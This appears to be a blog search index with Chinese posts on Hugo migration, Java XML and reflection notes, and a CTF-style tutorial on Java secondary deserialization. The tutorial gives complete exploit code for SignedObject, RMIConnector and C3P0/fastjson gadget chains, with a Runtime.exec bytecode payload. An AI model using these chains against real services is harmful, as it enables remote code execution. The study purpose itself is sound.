html 到 static 目录下，重新部署网站，部署完之后点击验证，验证成功代表没问题 第二步 在 search-console 中点击站点地图，然后把自己的添加进去，hugo 的默认在 sitemap.xml 下 百度 进入百度搜索资源平台，选择 用户中心-\u003e站点管理-\u003e添加网站，这里的验证方式也可以选择下载html的方式，步骤和google的一样，验证成功后选择 搜索服务-\u003e普通收录-\u003esitemap，输入sitemap的网址，和google的站点地图一样。不过百度的收录速度貌似很慢 必应 进入Bing Webmaster Tools，登录后直接导入google的数据就可以，很方便 辅助脚本 茯苓迎合自己的需求写了一个博客辅助脚本，生成文章时可以按照文章名生成文件夹，以 index.md 为文章内容，图片就可以保存在文件夹内以相对路径引用了，还有一些其他功能方便自己使用 地址：https://github.com/PoriaMs/wheelchair ","date":"2023-01-10","objectID":"/%E4%BB%8E-hexo-%E5%88%B0-hugo/:0:3","tags":null,"title":"从 Hexo 到 Hugo","uri":"/%E4%BB%8E-hexo-%E5%88%B0-hugo/"},{"categories":["JavaSec"],"content":"对 Java 二次反序列化学习研究整理 ","date":"2022-09-07","objectID":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/:0:0","tags":null,"title":"二次反序列化，看我一命通关","uri":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/"},{"categories":["JavaSec"],"content":"前言 不记得是哪一场比赛了，遇到了一个 Java 的题目，过滤了很多关键类，不管茯苓把 CC 链如何拆开组合，都没有办法绕过 就在此时，大佬看了一眼说，用二次反序列化就可以绕过了。“二次反序列化”这六个字重重地敲在了我的心巴上，从那以后我就对二次反序列化产生了莫名的渴望 茯苓开始详细学习时，发现没有二次反序列化比较系统的学习文章，那么，就自己总结一个 简单介绍下二次反序列化，顾名思义，就是反序列化两次，其主要意义是绕过黑名单的限制或不出网利用 PS：本文用到的工具类会放在文末 ","date":"2022-09-07","objectID":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/:0:1","tags":null,"title":"二次反序列化，看我一命通关","uri":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/"},{"categories":["JavaSec"],"content":"SignedObject 原理 它，是java.security下一个用于创建真实运行时对象的类，更具体地说，SignedObject包含另一个Serializable对象。 太完美了，这个类简直是为二次反序列化而存在的，来关注下它的getObject() 反序列化的内容也是可控 那么茯苓思路瞬间清晰了，先构造一个恶意SignedObject KeyPairGenerator kpg = KeyPairGenerator.getInstance(\"DSA\"); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(恶意对象 用于第二次反序列化, kp.getPrivate(), Signature.getInstance(\"DSA\")); 然后调用它的getObject()方法即可，那么现在压力来到了如何调用这个方法这边 rome ToStringBean 提到调用 getter 方法，茯苓第一个想到的就是 rome 反序列化，众所周知，rome 的ToStringBean的toString()方法可以办到这件事，理论上是可行的，实际也是可以构造的 因为ObjectBean其在实例化时会实例化三个 bean，这样构造出来的内容过分长了，茯苓不喜欢 大家可以自行构造试试，茯苓绝不是那种不负责的人，还是给出例子，但不进行具体分析 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.EqualsBean; import com.sun.syndication.feed.impl.ObjectBean; import javax.xml.transform.Templates; import java.security.*; import java.util.HashMap; import static util.Tool.*; public class R_test { public static void main(String[] args) throws Exception{ TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{ payload(\"mate-calc\").toBytecode()}); setFieldValue(obj, \"_name\", \"Poria\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); HashMap hashMap1 = getpayload(Templates.class, obj); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\"DSA\"); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap1, kp.getPrivate(), Signature.getInstance(\"DSA\")); HashMap hashMap2 = getpayload(SignedObject.class, signedObject); run(hashMap2, \"debug\", \"object\"); } public static HashMap getpayload(Class clazz, Object obj) throws Exception { ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, \"rand\")); HashMap hashMap = new HashMap(); hashMap.put(objectBean, \"rand\"); ObjectBean expObjectBean = new ObjectBean(clazz, obj); setFieldValue(objectBean, \"_equalsBean\", new EqualsBean(ObjectBean.class, expObjectBean)); return hashMap; } } EqualsBean rome 链的关键转折点在于pReadMethod.invoke(_obj,NO_PARAMS)，EqualsBean也存在这个关键代码 那么茯苓可以利用珍藏多年的 CC7 链，利用Hashtable来触发equals 这步是 CC7 的构造方式，因为要构造两遍，所以写为静态方法。 构造恶意TemplatesImpl，将其装入第一个Hashtable 构造恶意SignedObject，将其装入第二个Hashtable 最终 exp import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.EqualsBean; import javax.xml.transform.Templates; import java.security.*; import java.util.HashMap; import java.util.Hashtable; import static util.Tool.*; public class R_SignedObject { public static void main(String[] args) throws Exception{ TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{ payload(\"mate-calc\").toBytecode()}); setFieldValue(obj, \"_name\", \"Poria\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); Hashtable table1 = getPayload(Templates.class, obj); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\"DSA\"); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(table1, kp.getPrivate(), Signature.getInstance(\"DSA\")); Hashtable table2 = getPayload(SignedObject.class, signedObject); run(table2, \"debug\", \"object\"); } public static Hashtable getPayload (Class clazz, Object payloadObj) throws Exception{ EqualsBean bean = new EqualsBean(String.class, \"r\"); HashMap map1 = new HashMap(); HashMap map2 = new HashMap(); map1.put(\"yy\", bean); map1.put(\"zZ\", payloadObj); map2.put(\"zZ\", bean); map2.put(\"yy\", payloadObj); Hashtable table = new Hashtable(); table.put(map1, \"1\"); table.put(map2, \"2\"); setFieldValue(bean, \"_beanClass\", clazz); setFieldValue(bean, \"_obj\", payloadObj); return table; } } 值得一提的是，因为 rome 的特殊性，该利用既可以用于ObjectInputStream的反序列化，也可以用于HessianInput的反序列化，茯苓分别给出这两种情况下的调用栈 readObject:431, ObjectInputStream (java.io) getObject:179, SignedObject (java.security) invok","date":"2022-09-07","objectID":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/:0:2","tags":null,"title":"二次反序列化，看我一命通关","uri":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/"},{"categories":["JavaSec"],"content":"RMIConnector 原理 它，是javax.management下一个与远程 rmi 连接器的连接类，但却有自己的想法 关注它的findRMIServerJRMP方法 往上找，看到要求 path 以 /stub/ 开头 继续往上找，在该类的 public 方法connect中看到调用，要求 rmiServer 为 null 有一个绝佳的构造方法符合茯苓的要求 到此，这个利用方法就通了，给出构造 JMXServiceURL jmxServiceURL = new JMXServiceURL(\"service:jmx:rmi://\"); setFieldValue(jmxServiceURL, \"urlPath\", \"/stub/base64string\"); RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null); 现在只要能调用它的connect方法就可以了 CC链 说到调用任意方法，茯苓一下子就想到了 CC 链 InvokerTransformer 将connect装入 用TiedMapEntry封装LazyMap 最后装入HashMap用于触发整条链 完整 exp import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.remote.JMXServiceURL; import javax.management.remote.rmi.RMIConnector; import java.util.HashMap; import java.util.Map; import static util.Tool.*; public class CC_RMIConnector { public static void main(String[] args) throws Exception { JMXServiceURL jmxServiceURL = new JMXServiceURL(\"service:jmx:rmi://\"); setFieldValue(jmxServiceURL, \"urlPath\", \"/stub/base64string\"); RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null); InvokerTransformer invokerTransformer = new InvokerTransformer(\"connect\", null, null); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e lazyMap = LazyMap.decorate(map, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector); HashMap\u003cObject, Object\u003e expMap = new HashMap\u003c\u003e(); expMap.put(tiedMapEntry, \"Poria\"); lazyMap.remove(rmiConnector); setFieldValue(lazyMap,\"factory\", invokerTransformer); run(expMap, \"debug\", \"object\"); } } 调用栈 readObject:424, ObjectInputStream (java.io) findRMIServerJRMP:2007, RMIConnector (javax.management.remote.rmi) findRMIServer:1924, RMIConnector (javax.management.remote.rmi) connect:287, RMIConnector (javax.management.remote.rmi) connect:249, RMIConnector (javax.management.remote.rmi) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) transform:126, InvokerTransformer (org.apache.commons.collections.functors) get:158, LazyMap (org.apache.commons.collections.map) getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue) hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue) hash:339, HashMap (java.util) readObject:1410, HashMap (java.util) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) invokeReadObject:1170, ObjectStreamClass (java.io) readSerialData:2178, ObjectInputStream (java.io) readOrdinaryObject:2069, ObjectInputStream (java.io) readObject0:1573, ObjectInputStream (java.io) readObject:431, ObjectInputStream (java.io) 小结 这条链可以用于存在 CC 依赖但是有黑名单时候，说实话，茯苓觉得这个链很鸡肋，可能只能面对一些很极端的情况 ","date":"2022-09-07","objectID":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/:0:3","tags":null,"title":"二次反序列化，看我一命通关","uri":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/"},{"categories":["JavaSec"],"content":"WrapperConnectionPoolDataSource 原理 它，是com.mchange.v2.c3p0下的。。对不起编不下去了 WrapperConnectionPoolDataSource继承于WrapperConnectionPoolDataSourceBase，在WrapperConnectionPoolDataSourceBase中存在属性userOverridesAsString及其setter方法setUserOverridesAsString，触发fireVetoableChange事件处理 其中有一个判断语句，当其属性为userOverridesAsString时，将调用parseUserOverridesAsString方法 截取HexAsciiSerializedMap之后的内容，进入到fromByteArray 最后进入到deserializeFromByteArray中，进行二次反序列化 至此该链子就通了，构造起来呢，相信大家也都看出来了，可以利用 fastjson 来达成，在小于1.2.47的版本，使用缓存绕过 { \"rand1\": { \"@type\": \"java.lang.Class\", \"val\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\" }, \"rand2\": { \"@type\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\", \"userOverridesAsString\": \"HexAsciiSerializedMap:hexstring;\", } } 最后那个封号不要忘记！ C3P0_Hex 这条链子就得看依赖了，有什么打什么，记得把序列化后的内容转化为16进制字符就可以了 茯苓这里给出 CBShiro 的例子（别问，问就是偏爱） import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import static util.Tool.*; public class Hex { public static void main(String[] args) throws Exception{ TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{ payload(\"mate-calc\").toBytecode()}); setFieldValue(obj, \"_name\", \"Poria\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); PriorityQueue\u003cObject\u003e queue = new PriorityQueue\u003cObject\u003e(2, comparator); queue.add(\"1\"); queue.add(\"1\"); setFieldValue(comparator, \"property\", \"outputProperties\"); setFieldValue(queue, \"queue\", new Object[]{obj, null}); run(queue, \"debug\", \"hex\"); } } 同样的，给出调用栈 readObject:431, ObjectInputStream (java.io) deserializeFromByteArray:144, SerializableUtils (com.mchange.v2.ser) fromByteArray:123, SerializableUtils (com.mchange.v2.ser) parseUserOverridesAsString:318, C3P0ImplUtils (com.mchange.v2.c3p0.impl) vetoableChange:110, WrapperConnectionPoolDataSource$1 (com.mchange.v2.c3p0) fireVetoableChange:375, VetoableChangeSupport (java.beans) fireVetoableChange:271, VetoableChangeSupport (java.beans) setUserOverridesAsString:387, WrapperConnectionPoolDataSourceBase (com.mchange.v2.c3p0.impl) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:118, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:1061, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:756, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:271, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:267, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:370, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:523, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1335, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1301, DefaultJSONParser (com.alibaba.fastjson.parser) parse:152, JSON (com.alibaba.fastjson) parse:162, JSON (com.alibaba.fastjson) parse:131, JSON (com.alibaba.fastjson) parseObject:223, JSON (com.alibaba.fastjson) 小结 这条链子很明显，是配合Fastjson、Jackson环境下不出网利用的打法 ","date":"2022-09-07","objectID":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/:0:4","tags":null,"title":"二次反序列化，看我一命通关","uri":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/"},{"categories":["JavaSec"],"content":"用到的工具类 import com.alibaba.fastjson.JSON; import com.caucho.hessian.io.HessianInput; import com.caucho.hessian.io.HessianOutput; import javassist.ClassPool; import javassist.CtClass; import java.io.*; import java.lang.reflect.Field; import java.util.Base64; public class Tool { private Tool(){} public static void run(Object obj, String mode, String type) throws Exception { switch (type) { case \"object\" : String object = base64Encode(serialize(obj)); System.out.println(object); if (mode.equals(\"debug\")) deserialize((base64Decode(object))); break; case \"hessian\" : String hessian = base64Encode(hessianser(obj)); System.out.println(hessian); if (mode.equals(\"debug\")) hessiandeser(base64Decode(hessian)); break; case \"hex\" : byte[] bytes = serialize(obj); String hex = \"{\\n\" + \" \\\"rand1\\\": {\\n\" + \" \\\"@type\\\": \\\"java.lang.Class\\\",\\n\" + \" \\\"val\\\": \\\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\\"\\n\" + \" },\\n\" + \" \\\"rand2\\\": {\\n\" + \" \\\"@type\\\": \\\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\\",\\n\" + \" \\\"userOverridesAsString\\\": \\\"HexAsciiSerializedMap:\" + bytesToHexString(bytes, bytes.length) + \";\\\",\\n\" + \" }\\n\" + \"}\"; System.out.println(hex); if (mode.equals(\"debug\")) JSON.parseObject(hex); break; } } public static void deserialize(byte[] bytes) throws Exception { ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); } public static byte[] serialize(Object object) throws Exception { ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(object); return byteArrayOutputStream.toByteArray(); } public static void hessiandeser(byte[] bytes) throws Exception { ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); HessianInput hessianInput = new HessianInput(byteArrayInputStream); hessianInput.readObject(); } public static byte[] hessianser(Object object) throws Exception { ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream); hessianOutput.getSerializerFactory().setAllowNonSerializable(true); hessianOutput.writeObject(object); return byteArrayOutputStream.toByteArray(); } public static byte[] base64Decode(String string) { Base64.Decoder decoder = Base64.getDecoder(); return decoder.decode(string); } public static String base64Encode(byte[] bytes) { Base64.Encoder encoder = Base64.getEncoder(); return encoder.encodeToString(bytes); } public static String bytesToHexString(byte[] bArray, int length) { StringBuffer sb = new StringBuffer(length); for(int i = 0; i \u003c length; ++i) { String sTemp = Integer.toHexString(255 \u0026 bArray[i]); if (sTemp.length() \u003c 2) { sb.append(0); } sb.append(sTemp.toUpperCase()); } return sb.toString(); } public static CtClass payload(String string) throws Exception { String AbstractTranslet = \"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\"; ClassPool classPool = ClassPool.getDefault(); classPool.appendClassPath(AbstractTranslet); CtClass payload = classPool.makeClass(\"Evil\"); payload.setSuperclass(classPool.get(AbstractTranslet)); payload.makeClassInitializer().setBody( \"java.lang.Runtime.getRuntime().exec(new String[]{\\\"/bin/bash\\\", \\\"-c\\\",\\\"\" + string + \"\\\"});\"); return payload; } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField (final Class\u003c?\u003e clazz, final String fieldName ) throws Exception { try { Field field = clazz.getDeclaredField(fieldName); if ( field != null ) field.setAccessible(true); else if ( clazz.getSuperclass() != null ) field = getField(clazz.getSuperclass(), fieldName); return field; } catch ( NoSuchFieldException e ) { if ( !clazz.getSupe","date":"2022-09-07","objectID":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/:0:5","tags":null,"title":"二次反序列化，看我一命通关","uri":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/"},{"categories":["JavaSec"],"content":"结语 那么，就写到这里吧，再写，就不礼貌辣 ","date":"2022-09-07","objectID":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/:0:6","tags":null,"title":"二次反序列化，看我一命通关","uri":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/"},{"categories":["JavaSec"],"content":"参考文章 http://miku233.viewofthai.link/2022/05/29/buggyLoader/ https://su18.org/ https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BROME/ https://github.com/H3rmesk1t/Learning_summary/tree/main/WebSec/JAVA ","date":"2022-09-07","objectID":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/:0:7","tags":null,"title":"二次反序列化，看我一命通关","uri":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/"},{"categories":["Java"],"content":"JavaSE 笔记（完） Java 是一门非常严谨的语言 解析技术 认识一下嘛 XML 主要用于存储数据、做配置信息、进行数据传输 主要有两种解析方式：SAX 解析、DOM 解析 常见解析工具 名称 说明 JAXP SUN公司提供的一套XML的解析的API JDOM JDOM是一个开源项目，它基于树型结构，利用纯JAVA的技术对XML文档实现解析、生成、序列化以及多种操作。 dom4j 是JDOM的升级品，用来读写XML文件的。具有性能优异、功能强大和极其易使用的特点，它的性能超过sun公司官方的dom 技术，同时它也是一个开放源代码的软件，Hibernate也用它来读写配置文件。 jsoup 功能强大DOM方式的XML解析开发包，尤其对HTML解析更加方便 文档对象模型 Document 对象：整个 XML 文档 Node 对象： Element 对象：标签 Attribute 对象：属性 Text 对象：文本内容 Dom4j 解析框架 SAXReader 类 构造器/方法 说明 public SAXReader() 创建Dom4J的解析器对象 Document read(String url) 加载XML文件成为Document对象 Document 类 方法名 说明 Element getRootElement() 获得根元素对象 解析节点 方法名 说明 List\u003cElement\u003e elements() 得到当前元素下所有子元素 List\u003cElement\u003e elements(String name) 得到当前元素下指定名字的子元素返回集合 Element element(String name) 得到当前元素下指定名字的子元素,如果有很多名字相同的返回第一个 String getName() 得到元素名字 String attributeValue(String name) 通过属性名直接得到属性值 String elementText(子元素名) 得到指定名称的子元素的文本 String getText() 得到文本 用例 public void test() throws Exception { // 1、导入框架 // 2、创建SaxReader对象 SAXReader saxReader = new SAXReader(); // 3、加载XML文件成为文档对象Document对象。 Document document = saxReader.read(Dom4JTest2.class.getResourceAsStream(\"/poria.xml\")); // 4、先拿根元素 Element root = document.getRootElement(); // 5、提取contact子元素 List\u003cElement\u003e contactEles = root.elements(\"contact\"); // 6、准备一个ArrayList集合封装联系人信息 List\u003cContact\u003e contacts = new ArrayList\u003c\u003e(); // 7、遍历Contact子元素 for (Element contactEle : contactEles) { // 8、每个子元素都是一个联系人对象 Contact contact = new Contact(); // 因为解析出的值都是 String 类型，所以需要类型转换 contact.setId(Integer.valueOf(contactEle.attributeValue(\"id\"))); contact.setVip(Boolean.valueOf(contactEle.attributeValue(\"vip\"))); contact.setName(contactEle.elementTextTrim(\"name\")); contact.setGender(contactEle.elementTextTrim(\"gender\").charAt(0)); contact.setEmail(contactEle.elementText(\"email\")); // 9、把联系人对象数据加入到List集合 contacts.add(contact); } // 10、遍历List集合 for (Contact contact : contacts) { System.out.println(contact); } } 检索技术 认识一下嘛 XPath 在解析 XML 文档方面提供了一独树一帜的路径思想，更加优雅，高效 XPath 使用路径表达式来定位 XML 文档中的元素节点或属性节点 常用方法 方法名 说明 Node selectSingleNode(\"表达式\") 获取符合表达式的唯一元素 List\u003cNode\u003e selectNodes(\"表达式\") 获取符合表达式的元素集合 检索：绝对路径 采用绝对路径获取从根节点开始逐层的查找节点列表并打印信息 方法名 说明 /根元素/子元素/孙元素 从根元素开始，一级一级向下查找，不能跨级 检索：相对路径 先得到根节点 再采用相对路径获取下一级节点的子节点并打印信息 方法名 说明 ./子元素/孙元素 从当前元素开始，一级一级向下查找，不能跨级 检索：全文搜索 直接全文搜索所有的元素并打印 方法名 说明 //元素 找元素，无论元素在哪里 //元素/子元素 找元素，无论在哪一级，但子元素一定是元素的子节点 //元素//子孙元素 元素无论在哪一种，子孙元素只要是元素的子孙元素都可以找到 检索：属性查找 在全文中搜索属性，或者带属性的元素 方法名 说明 //@属性名 查找属性对象，无论是哪个元素，只要有这个属性即可。 //元素[@属性名] 查找元素对象，全文搜索指定元素名和属性名。 //元素//[@属性名=\"值\"] 查找元素对象，全文搜索指定元素名和属性名，并且属性值相等。 ","date":"2022-01-26","objectID":"/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8Bxml/:0:0","tags":null,"title":"愿天堂没有Java之XML","uri":"/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8Bxml/"},{"categories":["Java"],"content":"JavaSE 笔记（九） Java 是一门非常严谨的语言 反射 认识一下嘛 反射是指对于任何一个Class类，在运行的时候都可以直接得到这个类全部成分 全部成分指构造器对象Constructor，成员变量对象Field，成员方法对象Method 这种运行时动态获取类信息以及动态调用类中成分的能力称为Java语言的反射机制 关键 反射的第一步都是得到编译后的 Class 类对象，然后就可以得到 Class 的全部成分 HelloWorld.java -\u003e javac -\u003e HelloWorld.class Class c = HelloWorld.class; 获取类对象 方法一：Class类中的一个静态方法：forName(全限名：包名 + 类名) Class c = Class.forName(\"poria.Test\"); 方法二：类名.class Class c = Test.class; 方式三：对象.getClass() 获取对象对应类的Class对象 Test t = new Test(); Class c = t.getClass(); 获取构造器对象 Class 类用于获取构造器的方法 方法 说明 Constructor\u003c?\u003e[] getConstructors() 返回所有构造器对象的数组（只能拿public的） Constructor\u003c?\u003e[] getDeclaredConstructors() 返回所有构造器对象的数组，存在就能拿到 Constructor\u003cT\u003e getConstructor(Class\u003c?\u003e... parameterTypes) 返回单个构造器对象（只能拿public的） Constructor\u003cT\u003e getDeclaredConstructor(Class\u003c?\u003e... parameterTypes) 返回单个构造器对象，存在就能拿到 Constructor 类用于创建对象的方法 符号 说明 T newInstance(Object... initargs) 根据指定的构造器创建对象 public void setAccessible(boolean flag) 设置为true,表示取消访问检查，进行暴力反射 获取成员变量对象 Class 类用于获取成员变量的方法 方法 说明 Field[] getFields() 返回所有成员变量对象的数组（只能拿public的） Field[] getDeclaredFields() 返回所有成员变量对象的数组，存在就能拿到 Field getField(String name) 返回单个成员变量对象（只能拿public的） Field getDeclaredField(String name) 返回单个成员变量对象，存在就能拿到 Field 类中用于取值、赋值的方法 方法 说明 void set(Object obj, Object value) 赋值 Object get(Object obj) 获取值 获取方法对象 Class 类中用于获取成员方法的方法 方法 说明 Method[] getMethods() 返回所有成员方法对象的数组（只能拿public的） Method[] getDeclaredMethods() 返回所有成员方法对象的数组，存在就能拿到 Method getMethod(String name, Class\u003c?\u003e... parameterTypes) 返回单个成员方法对象（只能拿public的） Method getDeclaredMethod(String name, Class\u003c?\u003e... parameterTypes) 返回单个成员方法对象，存在就能拿到 Method 类中用于触发执行的方法 符号 说明 Object invoke(Object obj, Object... args) 运行方法 参数一：用obj对象调用该方法 参数二：调用方法的传递的参数（如果没有就不写） 返回值：方法的返回值（如果没有就不写） 作用 在运行时获得一个类的全部成分 破坏封装性 破坏泛型的约束性 做高级框架底层技术 注解 认识一下嘛 Java 语言中的类、构造器、方法、成员变量、参数等都可以被注解进行标注 对 Java 中类、方法、成员变量做标记，然后进行特殊处理 自定义注解 格式 public @interface 注解名称 { public 属性类型 属性名() default 默认值 ; } value 属性，如果只有一个 value 属性的情况下，使用 value 属性的时候可以省略 value 名称不写 元注解 就是用来注解注解的注解（绕口令 元注解有两个 @Target：约束自定义注解只能在哪些地方使用 常用值 TYPE，类，接口 FIELD，成员变量 METHOD，成员方法 PARAMETER, 方法参数 CONSTRUCTOR, 构造器 LOCAL_VARIABLE, 局部变量 @Retention：申明注解的生命周期 常用值 SOURCE： 注解只作用在源码阶段，生成的字节码文件中不存在 CLASS： 注解作用在源码阶段，字节码文件阶段，运行阶段不存在，默认值. RUNTIME：注解作用在源码阶段，字节码文件阶段，运行阶段（开发常用） 用例 @Target({ElementType.METHOD,ElementType.FIELD}) // 元注解 @Retention(RetentionPolicy.RUNTIME) // 一直活着，在运行阶段这个注解也不消失 public @interface MyTest { } 注解解析 注解的操作中经常需要进行解析，注解的解析就是判断是否存在注解，存在注解就解析出内容 注解相关接口 Annotation：注解的顶级接口，注解都是 Annotation 类型的对象 AnnotatedElement：该接口定义了与注解解析相关的解析方法 常用方法 方法 说明 Annotation[] getDeclaredAnnotations() 获得当前对象上使用的所有注解，返回注解数组。 T getDeclaredAnnotation(Class\u003cT\u003e annotationClass) 根据注解类型获得对应注解对象 boolean isAnnotationPresent(Class\u003cAnnotation\u003e annotationClass) 判断当前对象是否使用了指定的注解，如果使用了则返回true，否则false 所有的类成分Class，Method，Field，Constructor，都实现了 AnnotatedElement 接口他们都拥有解析注解的能力 技巧 注解在哪个成分上，我们就先拿哪个成分对象。 比如注解作用成员方法，则要获得该成员方法对应的 Method 对象，再来拿上面的注解 比如注解作用在类上，则要该类的 Class 对象，再来拿上面的注解 比如注解作用在成员变量上，则要获得该成员变量对应的 Field 对象，再来拿上面的注解 单元测试 单元测试就是针对最小的功能单元编写测试代码，Java 程序最小的功能单元是方法，因此，单元测试就是针对 Java 方法的测试，进而检查方法的正确性 测试方法使用 @Test 注解标记 定义的测试方法必须是无参数无返回值，且公开的方法 注解 说明 @Test 测试方法 